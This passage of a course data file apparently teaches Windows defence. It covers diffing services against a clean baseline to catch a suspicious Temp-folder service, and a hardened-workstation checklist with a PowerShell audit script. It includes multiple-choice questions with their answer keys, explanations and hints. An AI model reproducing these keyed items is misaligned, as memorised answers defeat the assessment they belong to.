  Select Name, PathName, StartName, StartMode
Compare-Object $base $now -Property Name, PathName |
  Where-Object SideIndicator -eq '=>'`,
        output: `Name         PathName                                     SideIndicator
----         --------                                     -------------
WinDefragSvc C:\\Users\\student\\AppData\\Local\\Temp\\wds.exe  =>
# "=>" means present now but NOT in the baseline: a new service
# from a Temp folder appeared since clean. Investigate.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is comparing a system against a known-clean baseline such a powerful detection technique?',
        options: [
          'Baselines make the system run faster',
          'Attacker activity is a deviation from the known-good state, so diffing "what is" against "what should be" surfaces new services, accounts, auto-starts and ports that no signature or alert may have caught',
          'It replaces the need for logging',
          'It only works on domain controllers',
        ],
        answer: 1,
        explain:
          'Intrusions change the system: a new service, admin, auto-start entry or listening port. If you captured what the clean machine looked like, a diff reveals exactly those changes — proactively, without needing a pre-written rule for each. Storing the baseline off-host (so it cannot be tampered with) and diffing regularly is a core proactive method, and pairs naturally with fleet-wide stacking to find the outlier host.',
        hint: 'If you know what "clean" looks like, what does everything that appeared since tell you?',
      },
    },

    {
      id: 'bwin-a-12',
      title: 'Project: harden a Windows workstation',
      read: `Combine the level into a **hardened workstation baseline** — the checklist you would apply to a fresh Windows machine, and audit an existing one against. This is the Windows counterpart to "harden a fresh box" on Linux.

## The baseline

**Accounts & privilege**
- Everyday accounts are standard users; UAC at highest; built-in Administrator disabled.
- Minimal Administrators membership; unused accounts disabled; strong passphrases + MFA.
- Dangerous user rights (SeDebug, SeBackup, etc.) restricted to admins only.

**Logging (so detection is possible)**
- Advanced Audit Policy on (logon, account mgmt, privilege use, process creation).
- Command-line auditing (4688) and PowerShell Script Block Logging (4104) enabled.
- Sysmon deployed with a good config.

**Prevent & protect**
- Defender real-time on, no unexplained exclusions, signatures current.
- Firewall enabled on all profiles, default-deny inbound.
- BitLocker on (TPM+PIN); recovery keys escrowed.
- Application control (AppLocker/WDAC) in audit, moving to enforce.
- Credential Guard + LSASS RunAsPPL on.

**Reduce legacy surface**
- SMBv1 removed; SMB signing required; LLMNR/NBT-NS disabled; NTLM curtailed.
- RDP not internet-facing (VPN + MFA); unneeded features/software removed.

**Patch & baseline**
- Windows + third-party patching current; no pending-reboot gaps.
- Capture the auto-start/service/account/port baseline; store off-host; diff periodically.

## The measure of success

A junior installs Windows and calls it done. An amateur defender applies a **written, repeatable baseline** that hardens the box *and* makes it observable — so that if something does get in, the logging captures it, the persistence spots are known, and a baseline diff surfaces the change. On a domain, this baseline becomes a **GPO** applied to every workstation at once.

> Keep the baseline as a script/checklist in version control, run it on new machines, and audit existing ones against it. Hardening that is written down, applied consistently, and re-checked is the hardening that is still there next month — the same lesson as on Linux, in Windows form.`,
      sample: {
        lang: 'powershell',
        caption: 'A one-shot audit of the hardened-workstation baseline',
        code: `$sys = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
"UAC (should be 1) : " + (Get-ItemProperty $sys EnableLUA).EnableLUA
"Defender RTP      : " + (Get-MpComputerStatus).RealTimeProtectionEnabled
"Firewall (all on) : " + ((Get-NetFirewallProfile).Enabled -join ',')
"BitLocker C:      : " + (Get-BitLockerVolume C:).ProtectionStatus
"SMBv1 present     : " + (Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol).State
"Local admins      : " + ((Get-LocalGroupMember Administrators).Name -join ',')`,
        output: `UAC (should be 1) : 1
Defender RTP      : True
Firewall (all on) : True,True,True
BitLocker C:      : On
SMBv1 present     : Disabled
Local admins      : student,support   <- review: is 'support' needed?`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'The hardened-workstation baseline enables lots of logging (audit policy, command-line/PowerShell logging, Sysmon) in addition to preventive controls. Why is including the logging essential, not optional?',
        options: [
          'Logging is only for compliance paperwork',
          'Preventive controls will sometimes be bypassed, so the baseline must also make the machine observable — with the right logging enabled, an intrusion that gets through is still captured and can be detected and investigated; without it, a bypass is silent',
          'Logging replaces the need for Defender and the firewall',
          'Logging makes the machine faster',
        ],
        answer: 1,
        explain:
          'Hardening reduces the chance of compromise but never eliminates it (assume breach). The logging in the baseline is what turns a successful bypass from invisible into detectable: command-line/PowerShell logs and Sysmon record what the attacker did, the persistence map tells you where to look, and a baseline diff surfaces their changes. Prevention plus observability is the whole posture — either alone leaves a gap.',
        hint: 'What happens after an attacker slips past the preventive controls if nothing was recording?',
      },
    },
  ],
}

export default level
